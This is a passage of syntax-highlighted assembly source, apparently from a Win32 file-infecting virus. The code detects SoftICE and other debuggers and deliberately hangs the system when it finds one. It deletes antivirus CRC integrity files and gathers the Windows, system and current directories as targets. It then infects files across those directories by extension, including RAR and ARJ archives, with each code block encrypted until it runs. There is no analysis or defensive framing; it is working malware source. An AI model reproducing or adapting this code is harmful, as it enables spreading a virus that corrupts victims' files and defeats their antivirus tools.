</span><span class="sc5">SearchDriverz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; This little trick allows</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; us to check for drivers,</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">                       </span><span class="sc1">; so we can check for our</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">                       </span><span class="sc1">; beloved SoftICE in its </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Win9x and WinNT versions!</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoDriverFound</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SoftICE</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">NoDriverFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">eosz_edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">Billy_Bel</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">SearchDriverz</span><span class="sc0">

    </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">some_antidebug</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; ECX = Context of debugger</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">more_antidebug</span><span class="sc0">                  </span><span class="sc1">; If ECX&lt;&gt;0, we're debugged</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">hangit</span><span class="sc0">

</span><span class="sc5">more_antidebug</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">pushs</span><span class="sc0">   </span><span class="sc3">"IsDebuggerPresent"</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Same than above, but API</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TAD_Exit</span><span class="sc0">                        </span><span class="sc1">; based</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TAD_Exit</span><span class="sc0">

</span><span class="sc5">hangit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                         </span><span class="sc1">; Hahahahah! DiE-DiE-DiE!!!</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">eBlock4</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">TAD_Exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">TAD_RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TAD_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">ThrAntiDebugger</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Thread used for delete AV CRC files                                    ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">ThrDeleteCRC</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">delta_thread</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta_thread</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">TDC_Sleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
</span><span class="sc5">TDC_semaphore</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TDC_Sleep</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TDC_SetupSEH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TDC_RestoreSEH</span><span class="sc0">
</span><span class="sc5">TDC_SetupSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock5</span><span class="sc4">-</span><span class="sc5">Block5</span><span class="sc0">

</span><span class="sc5">Block5</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Files2Kill</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Load pointer to first file</span><span class="sc0">

</span><span class="sc5">killem</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Push file to erase</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_DeleteFileA</span><span class="sc0">                    </span><span class="sc1">; Delete it!</span><span class="sc0">
    </span><span class="sc5">eosz_edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">Billy_Bel</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">killem</span><span class="sc0">       

</span><span class="sc5">eBlock5</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">TDC_RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TDC_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">ThrDeleteCRC</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Thread used for retrieve all the useful info for infection             ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">ThrPrepareInf</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">delta_thread</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta_thread</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">TPI_Sleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
</span><span class="sc5">TPI_semaphore</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TPI_Sleep</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TPI_SetupSEH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TPI_RestoreSEH</span><span class="sc0">
</span><span class="sc5">TPI_SetupSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock6</span><span class="sc4">-</span><span class="sc5">Block6</span><span class="sc0">

</span><span class="sc5">Block6</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WindowsDir</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get windows directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">                         </span><span class="sc1">; Get system directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetSystemDirectoryA</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">                         </span><span class="sc1">; Get current directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">

</span><span class="sc5">eBlock6</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">TPI_RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TPI_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">ThrPrepareInf</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Thread used for infect files                                           ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">ThrInfectFiles</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">delta_thread</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta_thread</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">TIF_Sleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
</span><span class="sc5">TIF_semaphore</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TIF_Sleep</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TIF_SetupSEH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TIF_RestoreSEH</span><span class="sc0">
</span><span class="sc5">TIF_SetupSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock7</span><span class="sc4">-</span><span class="sc5">Block7</span><span class="sc0">

</span><span class="sc5">Block7</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">directories</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Pointer to array of dirs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mirrormirror</span><span class="sc4">],</span><span class="sc5">dirs2inf</span><span class="sc0">
</span><span class="sc5">requiem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Set it as current</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Preserve that pointer</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Extensions_Table</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Pointer to exts table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">nExtensions</span><span class="sc0">
</span><span class="sc5">DirInf</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EXTENSION</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Ptr to active extension</span><span class="sc0">
    </span><span class="sc6">movsd</span><span class="sc0">                                   </span><span class="sc1">; Put next one</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">                          </span><span class="sc1">; Infect some filez</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DirInf</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">                         </span><span class="sc1">; Ptr to next dir</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mirrormirror</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; eeeooo supeeeeeerrr... :)</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">requiem</span><span class="sc0">

</span><span class="sc5">eBlock7</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">TIF_RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TIF_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">ThrInfectFiles</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Search all the files (until limit reached) matching with search mask   ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock8</span><span class="sc4">-</span><span class="sc5">Block8</span><span class="sc0">

</span><span class="sc5">Block8</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">; reset countah</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Find's shit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SEARCH_MASK</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindFirstFileA</span><span class="sc0">                 </span><span class="sc1">; Find da first file</span><span class="sc0">
    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FailInfect</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EXTENSION</span><span class="sc4">],</span><span class="sc3">"RAR"</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ArchInfection</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EXTENSION</span><span class="sc4">],</span><span class="sc3">"JRA"</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ArchInfection</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infection</span><span class="sc0">
